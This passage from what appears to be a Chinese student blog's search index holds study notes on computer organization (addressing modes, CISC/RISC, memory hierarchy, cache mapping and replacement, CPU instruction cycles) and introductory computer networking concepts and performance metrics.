访存次数 直接寻址 EA=A 1 间接寻址 EA=(A) 2 寄存器寻址 EA=R 0 寄存器间接寻址 EA=(R) 1 隐含寻址 程序指定 0 立即寻址 A 为操作数 0 基址寻址 EA=(BR)+A 1 变址寻址 EX=(IX)+A 1 相对寻址 EA=(PC)+A 1 堆栈寻址 入栈\\出栈时 EA 的确定方式不同 硬堆栈不访存,软堆栈访存 1 次 CISC 和 RISCCISC 设计思路一条指令完成一个复杂的基本功能 80-20 规律典型程序中 80%的语句使用处理机中 05 的指令 特点一条指令有一个专门的电路完成, 有的复杂指令用纯硬件难以实现采用 存储程序的设计思想, 由一个比较通用的电路配合存储部件完成一条指令 RISC 设计思路一条指令完成一个基本动作多条指令组合完成一个复杂的基本功能一条指令对应一个电路, 电路设计相对简单,功耗更低 对比 名称 CISC RISC 指令系统 复杂, 庞大 简单, 精简 指令数目 一般大于 200 条 一般小于 100 条 指令字长 不固定 定长 可访存指令 不加限制 只有 Load\\Store 指令 各种指令的执行时间 相差较大 绝大多数在一个周期内完成 各种指令使用频率 相差很大 都比较常用 通用寄存器数量 较少 多 目标代码 难以用优化编译器生成高效的目标代码 采用优化的编译程序,生成代码较为高效 控制方式 绝大多数可为微程序控制器 绝大多数为组合逻辑控制 指令流水线 可以通过一定方式实现 必须实现","link":"/2021/07/05/COP-4/"},{"title":"计算机组成原理——专业名词","text":"计算机组成原理中一些常见名词的总结 数据通路带宽,吞吐量,响应时间 数据通路带宽: 数据总线一次冰雪传送信息的位数 吞吐量: 系统在单位时间内处理请求的数量 响应时间: 指用户向计算机发送一个请求,到系统对该请求做出响应所需要的等待时间 一般使用吞吐量来评价计算机系统的综合性能 地址空间,存储字长,数据字长 地址空间: 地址由多少位就有多少个线性空间 存储字长: 存放在一个存储单元中的二进制代码位数, 等于MDR的位数 数据字长: 数据总线一次能并行传送的位数 机器字长: 计算机位数, 表示计算机一次能处理的二进制位数 机器字长决定计算机精度 机器字长=CPU内部用于整数运算的运算器和通用寄存器的位数 指令字长=存储字长(MDR)=机器字长 存储器相关名词查看详情 MDR: 地址寄存器, $长度=log_2总容量$ MAR: 数据寄存器 存储单元: 每个存储单元存放一串二进制码 存储字: 存储单元中二进制代码的组合 存储字长: 存储单元中二进制代码的位数 存储元: 存储一个二进制位(1bit) CPU相关名词查看详情 机器字长: CPU进行一次整数运算所能处理的二进制数据的位数(通常与ALU之间相关) 指令字长: 一条指令的总长度(可能会变) 半字长指令, 单字长指令, 双字长指令指的是指令长度是机器字长的多少倍 时钟周期: 单位 微妙 纳秒 $CPU主频(时间频率)=\\frac{1}{CPU的时钟周期}$,单位赫兹(Hz) CPI: 指令执行所需的时钟周期数量 IPS: $每秒执行多少条指令=\\frac{主频}{平均CPI}$ FLOPS: 每秒钟可以执行多少次浮点运算 $平均指令周期=\\frac{1}{IPS}(单位由IPS决定)$ 一般使用IPS标志系统性能 最小时间单位是时钟周期 常说的运算速度就是指CPI 这里常考计算,因此要注意$程序的运行时间=\\frac{指令数量}{IPS}$ ,有时题目会挖坑改变CPI,因此要注意转换问题$1G=10^3M=10^6K=10^9$, 用来表示$Hz, IPS, FLOPS$, 如$MHz, MIPS$$1MHz=1\\mu s, 1Hz=1ms$两个芯片片内逻辑相同=两个芯片的CPI相同","link":"/2021/06/29/COP-WORDS/"},{"title":"计算机组成原理——存储系统","text":"计算机组成原理——存储系统笔记 基本概念 辅存的数据要读入主存才能被 CPU 访问 cache: 放置频繁被访问的数据,加快 CPU 读/写数据的速度(缓解 CPU 与主存之间的速度矛盾) 主存-辅存层由硬件+操作系统完成解决了主存容量不够的问题 cache-主存层由硬件自动完成解决主存与 CPU 速度不匹配的问题 硬盘输入直接存取存储器, CPU不能之间访问硬盘 性能指标 $存储容量 = 存储字数 \\times 字长$, MDR 位数反应存储字长 $单位成本(每位价格)=总成本 \\div 总容量$ $\\spadesuit 存储速度 (数据传输率) = 数据的宽度 \\div 存储周期$ $存取周期T_m=存取时间T_a+恢复时间$ 存取时间是从启动一次存储器操作到完成该操作所需时间,分为读出时间和写入时间 存取周期指存储器进行一次完整的读写操作所需的全部时间,即连续两次独立地访问存储器操作之间所需最小的时间间隔 主存带宽($B_m$)表示从主存进出信息的最大数量单位通常为 字/秒, 字节/秒, 位/秒(b/s) 提高带宽的方法 采用高速DRAM芯片 采用多体交叉存储结构 刷新存储器与其连接的硬件的内部总线宽度加倍 采用双端口存储器分离不同端口 RAM(随机存取) 芯片 会考求芯片的引脚数一般的输入有地址线, 数据线, 读写线, 片选线等(供电引脚, 接地引脚), 根据存储容量,判断出地址线和数据线需要有多少位($地址线数量=log_2(\\frac{总热量}{每个单元的大小}), 数据线=每个单元的大小$)注意,通常情况下DRAM使用了地址复用技术, 则地址线减半, 增加行通选和列通选(2根线),如果要使用最少的线, 则片选线可以使用行通选代替 MDR数据总线, 宽度=存储字长 作用: 存放由内存中读出或写入内存的信息 MAR地址总线 若主存地址空间大小为$N$(B),则$MAR的位数=log_2(N)$ 作用: 用来存放当前CPU访问的内存单元地址, 或存放CPU写入内存的内存单元地址 存储元存储一个二进制位 存储单元多个存储元组成的部件(个数一般为存储字长的 bit 位数) 存储体由多个存储单元构成 译码器将输入地址转化为输出线输出的高电平信号,每一个输出线对应一个存储单元 控制电路控制译码器和 MDR 片选线, 芯片选择信号(低电平时启用)($\\overline{CS} 或 \\overline{CE} $) 读($\\overline{WE}$)\\写($\\overline{OE}$)控制线当只有一根读\\写控制线时,$\\overline{WE}$ 表示低电平写, $WE$ 表示高电平读当有两根读\\写线时,$\\overline{WE}$ 表示低电平允许写, $\\overline{OE}$ 表示低电平允许读 常见的描述方法$ 8\\times 8$, 第一个8表示有多少个存储单元,第二个表示存储字长 如: $8K \\times 8$, 表示$2^{13} \\times 8 bit$ 且一共有$log_2(8K)$个地址 DRAM 与 SRAM 常考考点 两者的比较 2. DRAM 的刷新 3. DRAM 的地址线复用技术 DRAM 与 SRAM 的区别 类型 SRAM(静态 RAM) DRAM(动态 RAM) 作用 常用于 Cache 常用于主存 存储方式 双稳态触发器存储信息 栅极电容存储信息 破坏性读出 否 是 读出后需要重写 否 是 运行速度 快 慢 集成度 低 高 发热量 高 低 存储成本 高 低 特性 断电后信息消失 断线后信息消失 需要”刷新” 不需要 需要 送行列地址 同时 分两次(地址线复用技术) DRAM 刷新“刷新”: 因为电容里的电荷只能存在2ms, 因此2ms之内,必须给电容充电 刷新周期: 2ms 每次刷新一行存储单元(存储器的行列地址的一行) 行列地址:存储单元像数组一样排列,分别使用行地址译码器和列地址译码器,将地址的前 $\\frac{n}{2}$ 位看作行地址,后 $\\frac{n}{2}$ 位看作列地址 硬件刷新, 读出一行信息后重新写入, 占用 1 个读/写周期 刷新方法(常考) 注: 刷新周期一般为 2ms, 若题目给出,则以题目为主例: 设 DRAM 排列结构位$128\\times128$, 读写周期为0.5us, 2ms共 $\\frac{2ms}{0.5us}=4000个周期$ 方法一: 分散刷新每次读写完刷新一行(导致存取周期翻倍,周期变为1us)前0.5us用来正常读写, 后0.5us用来刷新某行, 2ms内,刷新2000次,对于 $128\\times128$ 的结构来说,足够 方法二: 集中刷新2ms内集中安排刷新方式,系统的存取周期还是0.5us在这段时间内无法访问存储器,称为访存”死区”对于 $128\\times128$ 的结构来说, 在最后的128(行数)个周期(64us)内集中刷新 方法三: 异步刷新2us内需要产生128次刷新请求即 每过 $\\frac{2ms}{128} = 15.6us$, 刷新一次, 每15.6us内有0.5us的”死时间” 对于排列成$N\\times N$的存储芯片, 存取周期为a需要在2ms内将$N$行都刷新 使用分散刷新 系统的存取周期为$2a$ 使用集中刷新 2ms内集中刷新$N$行, 死亡时间为$aN$ms 使用异步刷新(分散刷新和集中刷新结合) $刷新周期=\\lfloor \\frac{2ms}{N} \\rfloor$ DRAM 的地址线复用技术 注意: 在求引脚数时, 要注意DRAM采用了地址线复用技术,即地址线数量减半 将行地址与列地址分两次传输先将行地址存放到行地址缓冲器,再将列地址传送到列地址缓冲器,之后在送给行地址与列地址译码器 ROM 芯片 MROM 掩模式制度存储器在芯片生成过程中直接写入信息, 之后不可重写, 只能读出可靠性高, 灵活性差, 生产周期长, 只适合定制 PROM 可编程只读存储器用专门的 PROM 写入器写入信息, 写一次后不可更改 EPROM 可擦除可编程只读存储器允许用户写入信息, 可用某种方法擦除信息, 可多次重写 UVEPROM使用紫外线照射 8~20 分钟可擦除所有信息 EEPROM($E^2PROM$)使用电擦除特定的字 Flash Memory 闪速存储器(只读存储器)断电后也能保存信息, 可进行多次快速擦除重写需要先擦除在写入, 因此写速度要慢于读速度 如 U 盘, SD 卡等每个存储元使用单个 MOS 管, 位密度比 RAM 高 SSD 固态硬盘由 控制单元 + 存储单元(Flash 芯片) 构成, 可进行多次快速擦除重写速度快 功耗低, 价格高 主存一般由 RAM+ROM 组成,且二者统一编址 存储芯片与 CPU 的连接 注意片选线的符号是表示高电平有效还是低电平有效 位扩展 容量不变, 字长增加 CPU 相同的地址线连接多个芯片的地址线, 每个芯片的数据输出线连接到 CPU 不同的数据输入口 字扩展 容量增加, 字长不变 CPU 相同的地址线连接多个芯片的地址线, 每个芯片的数据输出线连接到 CPU 相同的数据输入口其余地址线连接芯片的片选线 线选法剩余的地址线分别连接芯片的片选线即高位地址线控制选择的芯片, 若用于选择芯片的地址线输出多个 1, 数据总线会产生冲突 译码片选法(常考)将多余地址线连接到译码器,译码器的输出连接到芯片的片选线, 即高地址为控制选择哪个芯片 译码器的使用, 选择的是哪些芯片地址空间属于哪块芯片 双端口 RAM用于优化多核 CPU, 多个 CPU 同时访问 RAM需要两组完全独立的数据线, 地址线和控制线 注意对于同一地址不能同时写,或同时写读 多模块存储器特点: 每个模块都有相同的容量和存取速度, 各模块拥有独立的读写控制电路, 地址寄存器和数据寄存器, 既能并行工作, 也能交叉工作 单体多字存储器 每次并行读出 m 个连续的字 总线宽度也为 m 个字 一次并行读出 m 个字, 不能单独读取其中某个字 指令和数据在主存必须是连续存放 多体并行存储器 设每个存储体的存取周期为 T, 存取时间为 r, 恢复时间为 3r, T=4r 高位交叉编制 用高比特位来表示要访问那个内存条,这些比特位被成为体号 理论上多个存储体可以被并行访问,但由于通常会连续访问, 因此实际上效果相当于单纯的扩容 在一个内存条内地址编号是连续的, 不满足程序的局部性原理 如果连续访问连续的地址(在同一个内存条内的地址),需要等待上一个存储体恢复周期结束才能读取下一个, 因此需要花费 nT 的时间(即一个 T 内只能读取一个存储体) 低位交叉编制 用低比特位来表示要访问那个内存条,这些比特位被成为体号 在同一内存条内地址编号不连续, 满足程序的局部性原理01H 地址对应第一根内存条的第一个存储体,而 02H 对应第二根内存条的第一个存储体, 以此类推 如果连续访问连续的地址(在同一个内存条内的地址), 就不需要等待上一个存储体的恢复, 可以直接读取下一个存储体, 因此至需花费 T+(n-1)r(注意,这个算式是以 4 根内存条来计算 即在一个 T 内,可以读取地址连续的存储体为 4 个, 读取完第四个存储体后,刚好第一个内存条完成恢复时间,可以读取下一个,因此在一个周期内可以读取 4 个数据,读取完最后一个存储体后,在等待恢复时间 3r,即读取完成) 当存储模块数 $m \\geq \\frac{T}{r}$ 时, 可以使流水线不间断 每个存储周期内可读写地址连续的 m 个字 微观上, m 个模块被串行访问 宏观上, 每个存储周期内所有模块被并行访问 要会计算读取多少个字需要多长的时间注意: 时间包括等待模块写回的时间在题目中,r 可以被表示为存取时间或总线传输周期 CacheCache 使用 SRAM 实现 工作原理 局部性原理 空间局部性: 最近的未来要使用的信息(指令和数据)与现在使用的信息在存储空间上是邻近的 时间局部性: 最近的未来使用的信息是现在正在使用的信息 将 CPU 目前访问的地址周围部分的数据放到 Cache 中 性能指标(常考)$t_c为访问一次Cache所需的时间$$t_m为访问一次主存所需的时间$ 命中率 HCPU 欲访问的信息已在 Cache 中的比率 缺失率(未命中)M = 1 - H 平均访问时间 先访问 Cache,若 Cache 未命中在访问主存$t=Ht_c+(1-H)(t_c+t_m)$ 同时访问 Cahce 和主存,若 Cache 命中则立即停止访问主存$t=Ht_c+(1-H)t_m$ Cache主存系统的效率$e=\\frac{访问Cache的时间}{平均访问时间}$ 每次访问的主存块立即调入 Cache 中 Cache 与主存的映射方式 在 Cache 块中,通过标记记录存放的主存块号,通过有效位来表示标记是否有效 Cache 块的大小与主存块的大小相等 若主存大小为$256M=2^{28}, 块大小(行长)=64B=2^{6}$ 则主存的地址共 28 位 主存块号 块内地址 22 位 6 位 全相联映射(随意放)主存块可以放在 Cache 的任意位置 缺点查找标记慢 优点能充分利用Cache存储空间 CPU 访问方式 CPU 要访问的主存地址的块号与 Cache 中的标记进行对比 若标记匹配,且有效位=1, 则 Cache 命中 若未命中或有效位=0, 则正常访问主存 直接映射每个主存块只能放到一个特定的位置Cahce 块号=主存块号 % Cahce 总数 缺点不能充分利用 Cache, 命中率低 优点可以优化标记位,省略块号末尾的$log_2Cache块数$位, 速度最快 CPU 访问方式 取出块号的后$log_2Cache块数$位, 直接访问 Cache 中对应的块 若主存块号的其余位(除去$log_2Cache块数$位)与 Cache 标记位相同,且有效位为 1,则 Cache 命中 若未命中或有效位=0, 则正常访问主存 组相联映射Cahce 块分为若干组, 每个主存块可放到特定分组的任意一个位置 2 路组相联映射: 2 个 Cache 块为一组n 路组相联映射: n 个 Cache 块为一组 组号=主存块号 % 分组数 另外两种方法的折中, 综合效果比较好 CPU 访问方式 取出块号的后$log_2\\frac{Cache块数}{每个分组块数}$位, 找出对应的 Cache 组 在对应的Cahce分组中, 主存块号的其余位(除去$log_2\\frac{Cache块数}{每个分组块数}$位)与标志位对比,若相同且有效位=1,则Cache命中 若未命中或有效位=0, 则正常访问主存 Cache替换算法 全相联映射Cache完全满了才需要替换 直接映射如果对应位置非空, 则直接替换 组相联映射只有分组内满了才需要在分组内选择替换 随机算法(RAND)若Cache已满,则随机选择一块替换 优点实现简单 缺点没考虑局部性原理, 命中率低, 实际效果很不稳定先进先出算法(FIFO)若Cache已满, 替换最先被调入Cache的块 优点实现简单 缺点没考虑局部性原理, 命中率低, 最先进入Cache的可能是最频繁访问的 抖动现象刚被替换的块很快又被访问近期最少使用(LRU)(最常考)每一个Cache设置一个计数器(用来记录该Cache块有多长时间没被访问), 每次替换选择计数器最大的块(淘汰最久没访问的块) 计数器规则 命中时, 所命中的Cache的计数器清零, 比该计数器值更小的计数器值加1 未命中且还有空闲时, 新装入的Cache块的计数器置0, 其余非空闲计算机加1 未命中且无空闲时, 计数器最大的Cache块被替换,计数器置0,其余加1 优点实际运行效果优秀, Cache命中率高 缺点若被频繁访问的主存块数量&gt;Cache行的数量, 则有可能发生抖动近期不经常使用(LFU)每一个Cache设置一个计数器(用来记录每个块被访问过多少次), 每次替换计数器最小的块(淘汰最少使用的块) 计数器规则 新调入的块计数器=0 块被访问一次,对应的计数器+1 替换时, 替换计数器最小的块, 计数器置0 若有多个计数器最小的块 可以按行号递增(淘汰行号小的)或FIFO策略(淘汰先进入Cache的)淘汰 缺点曾经经常被访问的主存块,未来不一定会用到,因此有可能会在Cache中停留很长时间因为要存储命中次数,因此计数器的可能需要较大的存储空间Cache可能不高 Cache写策略 因为只有写操作才会导致Cache中的数据与主存中的数据不一致 当CPU的写操作在Cache中时,称为写命中; 不在Cache中,则称为写不命中写命中对应的算法有写回法和全写法 写回法当CPU对Cache写命中时, 只修改Cache的内容, 当此块被换出时, 才写回主存 脏位表示Cache中的数据是否被修改, 若修改则在该块被替换时写回主存 优点减少了访存的次数 缺点存在数据不一致的隐患全写法当CPU对Cache写命中时, 必须把数据同时写入Cache和主存中(一般使用写缓冲, 写缓冲通过SRAM实现) 优缺点使用写缓冲, CPU写的速度很快若写操作不频繁, 则效果好若写操作频繁,则可能会因为写缓冲饱和而发生阻塞 写分配法当CPU对Cache写不命中时, 把主存中的块调入Cache, 在Cache中修改.(通常搭配写回法) 非写分配法当CPU写不命中时,只写入主存,不调入Cache(常搭配全写法使用)在使用这种方法时, 只有读未命中才调入Cache中 各级Cache之间常使用全写法+非写分配法Cache与主存之间常使用写回法+写分配法 页式存储器 页式存储系统: 一个进程在逻辑上被分为若干个大小相等的页面,每个页面大小与块的大小相同. 每个页面可以离散的放入不同的主存块中 每个页面与主存块的大小相同 逻辑地址(虚地址): 程序员看到的地址由逻辑页号与页内地址组成, 页表一般存储在主存中 物理地址(是地址): 时间在主存的地址由主存块号和块内地址组成 页表中存储逻辑页号对应的主存块号 在使用逻辑地址时 计算机会将逻辑地址拆分成逻辑页号和页内地址 将逻辑页号取出, 然后在CPU中取出页表基地址 然后在页表中找到对应的主存块号; 主存块号拼接上页内地址后成为物理地址 块表 相当于地址变化过程中添加了一个Cache, 加快页号转换为主存块号的时间区别是快表存储的是页表项中的副本, 而Cache存储的是主存块的副本 在逻辑地址变化的基础上, 插入一个快表,先在快表中查找有无对应的主存块号快表使用SRAM, 是相联存储器, 可以按内容寻访","link":"/2021/06/27/COP-3/"},{"title":"计算机组成原理——中央处理器","text":"计算机组成原理——中央处理器笔记 CPUCPU 种对用户可见的寄存器有 程序状态字寄存器(PSW), 累加寄存器(ACC), 通用寄存器, 程序计数器(PC) 功能 指令控制 程序的顺序控制 完成取指令,分析指令和指令执行的操作 操作控制管理并产生由内存取出的每条指令的操作信号, 把各种操作信号送往相应的部件, 从而控制这些部件按指令的要求运行 时间控制对各种操作加上时间控制时间控制要为每条指令按时间顺序提供控制信号 数据加工对数据进行算数运算和逻辑运算 中断处理对计算机运行过程中出现的异常情况和特殊请求做处理 组成运算器对数据进行加工 运算器的结构 算术逻辑单元进行算数逻辑运算 通用寄存器组存放操作数和各种地址信息等 专用数据通路方式根据指令执行过程中的数据和地址的流动方向安排连接线路性能较高, 基本不存在数据冲突的现象, 但是结构复杂, 硬件量大, 不易实现 两个部件之间有专用线路 CPU 内部单总线方式将所有寄存器的输入和输出端连接到数据总线上, 用电信号来控制读\\写哪个寄存器结构简单,容易实现, 但数据传输存在较多冲突现象, 性能较低 暂存寄存器(使用 CPU 内部单总线方式时才存在)用于暂存从主存读来的数据 累加寄存器(ACC)用于暂时存放 ALU 的运算结果 程序状态字寄存器(PSW)保留由算术逻辑运算指令或测试指令的结果(溢出标志, 符号标志, 零标志等) 移位器对运算结果进行移位运算 计数器控制乘除运算的操作步骤 控制器协调并控制计算机各部件执行程序的指令序列有取指令, 分析指令, 执行指令的功能 控制器的组成 控制单元(CU)分析指令, 给出控制信号 指令寄存器(IR)存放当前执行的指令 程序计数器(PC)存放下一条指令地址, 有自动加 1 功能 微操作信号发生器根据 IR 的内容, PSW 的内容, 时序信号, 产生控制整个计算机系统所需的各种控制信号有组合逻辑型和存储逻辑型两种 时序系统产生各种时序信号(由统一时钟分频得到) 存储器地址寄存器(MAR)存放所要访问的主存单元的地址 存储器数据寄存器(MDR)存放向主存写入的信息或者从主存读出的信息 完成一条指令的步骤PC 取址令–&gt;IR 分析指令–&gt;CU 执行指令 指令执行 周期指令周期CPU 从主存中每取出并执行一条指令所需的全部时间指令周期用若干个机器周期来表示 机器周期机器周期也叫 CPU 周期机器周期用来表示完成某一个操作所用的时间 定长的机器周期执行每种操作所用的时间相同 不定长的机器周期执行不同操作所用的时间不相同 一个机器周期包含若干时钟周期 时钟周期时钟周期也称为节拍,T 周期,CPU 时钟周期,是 CPU 操作的最基本单位 指令周期流程四个工作周期都有 CPU 访存操作, 只是访存的目的不同 取址周期取指令的流程 将当前指令地址送至存储器地址寄存器(MAR)(PC)-&gt;MAR CU 发出控制信号(读信号), 经控制总线传到主存1-&gt;R 将 MAR 所指的主存内容经数据总线送入 MDRM(MAR)-&gt;MDR 将 MDR 中的内容(当前存放的是指令)送入 IR(MDR)-&gt;IR CU 发出控制信号, 形成下一条指令地址(PC)+1-&gt;PC 间址周期取有效地址 将指令的地址码送入 MAR Ad(IR)-&gt;MAR 或 Ad(MDR)-&gt;MAR CU 发出控制信号, 启动主存读操作 1-&gt;R 将 MAR 所指主存中的内容经数据总线送入 MDR M(MAR)-&gt;MDR 将有效地址送至指令的地址码字段 (MDR)-&gt;Ad(IR) 执行周期取操作数 中断周期暂停当前任务取完成其他任务, 需要保存断点(为了能够恢复当前任务)一般使用堆栈保存断点 CU 控制将 SP 减 1, 修改后的地址送入 MAR(SP)-1-&gt;SP, (SP)-&gt;MAR 堆栈一般是在主存中,故也可记为将断点地址存入某个存储单元 a-&gt;MAR CU 发出控制信号 启动主存做写操作1-&gt;W 将断点(PC 内容)送入 MDR(PC)-&gt;MDR CU 控制将中断服务程序的入口地址送入 PC(由向量地址形成部件产生 )向量地址-&gt;PC 指令执行方案 单指令周期 所有指令的周期相同 指令之间串行执行 指令周期取决于执行时间最长的指令的执行时间 会拖慢执行快额度指令的执行速度, 导致整个系统运行速度降低 多指令周期 对不同类型的指令选用不同的执行步骤来完成 指令之间串行执行 可选用不同个数的时钟周期来完成不同的指令 需要更复杂的硬件设计 流水线方案 在每一个时钟周期内启动一条指令 尽量多条指令同时运行, 但各自处于不同的执行步骤中 指令之间并行执行 数据通路(高频考)数据在各功能部件之间传送的路径 内部总线指同一部件, 如 CPU 内部连接各寄存器及运算部件之间的总线 系统总线指同一台计算机系统的各部件,如 CPU,内存,通道和各类 I/O 接口间相互连接的总线 Bus 指的是 CPU 内部总线 注意一定要表明控制信号也要注意题目给出的部件中控制信号的位置,根据位置来选择正确的控制信号 寄存器之间的数据传送例如 将 PC 内容送到 MAR, 流程及控制信号:(PC)-&gt;Bus ($PC_{out}$有效,表示 PC 内容传送到总线)Bus-&gt;MAR ($MAR_{in}$有效,表示总线内容写道 MAR) 也可记为(PC)-&gt;Bus-&gt;MAR 主存与 CPU 之间数据传送例如 CPU 从主存读取指令(PC)-&gt;Bus-&gt;MAR ($PC_{out}$和$MAR_{in}$有效)(将现在的指令地址传送到 MAR)1-&gt;R (CU 发读命令,通过控制总线发出)MEM(MAR)-&gt;MDR ($MDR_{in}$有效)MDR-&gt;Bus-&gt;IR ($MDR_{out}$,$IR_{in}$有效) 执行算术或逻辑运算例如加法指令Ad(IR)-&gt;Bus-&gt;MAR ($MDR_{out}$, $MAR_{in}$有效)1-&gt;R CU 发出读命令MEM(MAR)-&gt;数据线-&gt;MDR ($MDR_{in}$有效)MDR-&gt;Bus-&gt;Y ($MDR_{out}$, $ALU_in$有效)操作数-&gt;Y(ACC) + (Y)-&gt;Z ($ACC_{out}$,$ALU_{in}$有效)CU 向 ALU 发送加命令Z-&gt;ACC ($Z_{out}$,$ACC_{in}$有效) 结果-&gt;ACC 例题 分析指令的功能和指令周期(($R_0$)) + ($R_1$)-&gt;$(R_0$)有取址周期, 间址周期, 执行周期 写出各阶段的指令流程1-4 为取址周期: 公共操作5-7 为间址周期: 完成取数操作,被加数在主存中,加数已经放在寄存器$R_1$中8-10 为执行周期: 完成取数操作,被加数在主存中,加数已经放在寄存器$R_1$中 时序 微操作 有效控制信号 1 $(PC)-&gt;MAR$ $PC_{out}, MAR_{in}$ 2 $M(MAR)-&gt;MDR$,$(PC)+1-&gt;PC$ $MemR,MAR_{out},MDR_{in}E$ 3 $(MDR)-&gt;IR$ $MDR_{out},IR_{in}$ 4 $指令译码$ 5 $(R_0)-&gt;MAR$ $R0_{out},MAR_{in}$ 6 $M(MAR)-&gt;MDR$ $MemR,MAR_{out},MDR_{in}E$ 7 $(MDR)-&gt;Y$ $MDR_{out},Y_{in}$ 8 $(R_1)+(Y)-&gt;Z$ $R1_{out},ALU_{in}$,CU 向 ALU 发 ADD 控制信号 9 $(Z)-&gt;MDR$ $Z_{out},MDR_{in}$ 10 $(MDR)-&gt;M(MAR)$ $MemW,MDR_{out}E,MAR_{out}$ 控制器的设计硬部件","link":"/2021/07/06/COP-5/"},{"title":"计算机网络基础知识","text":"计算机体系结构是从功能上描述计算机网络结构 计算机体系结构称网络体系结构是分成结构 计算机网络体系结构是计算机网络的各层及协议的集合 体系结构是抽象的, 实现的是只能运行的一些具体软件 考察目标 掌握计算机网络的基本概念, 基本原理和基本方法 掌握计算机网络的体系结构和典型的网络协议, 了解典型网络设备的组成特点, 理解典型网络设备的工作原理 能够运用计算机网络的基本概念, 基本原理喝基本方法进行网络系统的分析,设计和应用 基础知识计算机网络的概念 计算机网络是一个将分散的, 具有独立功能的计算机系统,通过通信设备与线路连接起来,由功能完善的软件实现资源共享和信息传递的系统 计算机网络是互联的.自治的计算机集合 互联: 通过通信链路互联互通自治: 无主从关系 计算机网络的功能 数据通信 资源共享 分布式处理 提高可靠性 负载均衡 计算机网络的发展 ARPAnet 阿帕网-&gt;internet 互联网-&gt;Internet 因特网 ARPAnet 阿帕网只能实现相同网络的互连 目前使用的就是 Internet 网络将多台计算机连接到一起, 互联网将多个网络连接在一起, 因特网是世界上最大的互联网 注意与互联网(internet)中 i 的大小写区别 三级结构 主干网 地区网 校园网/企业网 3 连接到 2, 2 连接到 1 多层次 ISP 结构分为主干 ISP, 地区 ISP 和本地 ISP ISP: 因特网服务提供者或因特尔服务提供商, 是一个向用户提供互联网接入业务, 信息业务和增值业务的公式(如中国移动,电信等) 计算机网络的组成 组成部分硬件,软件,协议 协议:一系列规则和约定的集合 工作方式 边缘部分用户使用 C/S 方式(客户/服务器)或 P2P 方式(对等连接,不存在客户与服务器之分,每台主机既可以为服务器, 也可以为客户) 核心部分为边缘部分提供服务 功能组成 通信子网实现数据通信,各种传输介质,通信设备,相应的网络协议组成 OSI 的下三层网络层: 路由器数据链路层: 交换机,网桥物理层: 集线器,中继器 资源子网实现资源共享/数据处理, 实现资源共享功能的设备和软件集合 OSI 的上 3 层 网络分类按分布范围分 广域网(WAN)(交换技术)几十到几千公里, 因特网的核心部分, 跨国家 城域网(MAN)覆盖一个城市 局域网(LAN)(广播技术)如:一个学校或一个公司的范围 个人局域网(PAN)个人工作的地方,基本为 10m 左右 按使用者分 公用网 专用网 按交换技术分 电路交换有建立连接时延, 不使用存储转发, 因此在每个结点不存在转发时延 报文交换 分组交换将要发送的数据分组发送, 每个分组加上头部信息使用存储转发技术, 因此分组经过的结点都需要转发一次分组,有多个转发时延(计算分组交换时延时,需要注意) 分组数据的最佳大小计算设$D$为分组数据大小,$y$为开销字节总数(及发送全部分组需要添加的头部大小与全部重发分组头部大小), $a$为发送错误的分组数量, $b$为分组头部大小, $c$ 为总共要发送的数据大小 $$y=\\frac{b\\times c}{D} + D\\\\两边对D求导得: y’= 1 - \\frac{a \\times c}{D^2}\\\\令1 - \\frac{a \\times c}{D^2}=0,解得D即为分组数据得最佳大小$$ 按拓扑结构分 总线型 星型 设有 n 个结点,则有 n-1 条物理链路 环形 网状型 … 按传输技术分 广播式网络共享公告通信信道 点对点网络使用分组存储转发和路由选择机制 标准化工作标准的分类 法定标准 事实标准 RFC(因特尔标准的形式) 因特网草案 建议标准 草案标准(2011 年取消了这个阶段) 因特网标准 相关组织国际标准化组织(ISO),国际电信联盟(ITU),电气和电子工程师协会(IEEE),Internet 工程任务组(IETF) 计算机网络的性能指标(重要)1. 速率在计算机网络中,速率指数据率或数据传输率或比特率(比特是数据量的单位)速率就是连接在计算机网络上的主机在数字信道上传送数据位数的速率 码元传输率码元 也叫波特率, 码元速率, 波形速率, 调制速率, 符号速率 表示单位时间内传输的码元个数(脉冲个数或信号变化的次数)单位是 波特(Baud) 1 波特表示每秒传输 1 个码元 信息传输速率 别名信息速率, 比特率, 表示单位时间内传输的二进制码元的个数(比特数)单位是 比特/秒(b/s) 1 秒可以传输多少比特1 个码元携带$n$ bit 的信息, 且$M$ Baud 码元传输速对应的信息传输速率=$M \\times n$ bit/s 2. 带宽在数字设备中, 表示单位时间内从网络某一点到另一点所能通过的最高数据率(单位时间内通过链路的数据量) 在模拟信号系统中, 最高频和最低频的差值代表系统的通频带宽, 单位赫兹(Hz) 带宽现用来表示网络的通信链路传送数据的能力, 通常指单位时间内从网络中的某一点到另一点所能通过的最高数据率 也可以理解为是网络设备所支持的最高速度(将数据发送到链路上的发送速率)单位为 :b/s,kb/s, Mb/s,Gb/s 注意单位中的 b 为小写 3. 吞吐量用来表示在单位时间内通过某个网络(信道, 接口)的数据量吞吐量受网络的带宽或网络的额定速率的限制 所有链路速率之和为吞吐量 4. 时延数据(报文/分组/比特流)从网络或链路的一端传送到另一端所需的时间 发送时延发送分组的第一个比特算起,到该分组的最后一个比特发送所需的时间$$发送时延=\\frac{数据长度}{信道带宽(发送速率)}$$ 传播时延数据在信道上传播一定距离所花费的时间, 取决于电磁波传播速度(一般为$2\\times10^8m/s$)和链路长度$$传播时延=\\frac{信道长度}{电磁波在信道上的传播速率}$$ 排队时延等待输出/输入链路可用 处理时延检错和转发的时间 5. 时延带宽积 发送方在收到一个响应之前能够发送的数据量 某段链路现在又多少比特(以比特为单位的链路长度)(链路中的容量)$$时延带宽积(bit)=传播时延(s)\\times 带宽(bit/s)$$ 6. 往返时间 RTT RTT 越大, 在收到确认之前, 可以发送的数据越多注意这里隐含了传播时延的值 从发送发发送数据开始, 到发送方收到确认收到的确认所经历的时延 $$RTT包括\\begin{cases}往返传播时延=传播时延\\times 2\\\\末端处理时间\\end{cases}$$ 7. 利用率时延与利用率成正比关系 信道利用率$$信道利用率=\\frac{有数据通过的时间}{(有+无)数据通过的时间}$$ $$信道利用率=\\frac{一个发送周期内发送的比特数}{发送方数据传输率\\times 发送周期}$$ 注意发送周期包括传输时延和发送时延 $$信道吞吐率=信道利用率\\times 发送方的发送速率$$ 网络利用率$$网络利用率=信道利用率加权平均值$$ 分层结构 实体每一层操作的元素称为实体 对等实体同一层次的实体 协议为对等实体数据交换而建立的规则,标准或约定(水平的) 1. 语法: 规定传输数据的格式 2. 语义: 规定索要完成的功能 3. 同步: 规定各种操作的顺序 接口(访问服务点 SAP)上层使用下层服务的入口 仅在相邻层间有接口 服务下层为相邻上层提供的功能调用(垂直的) SDU 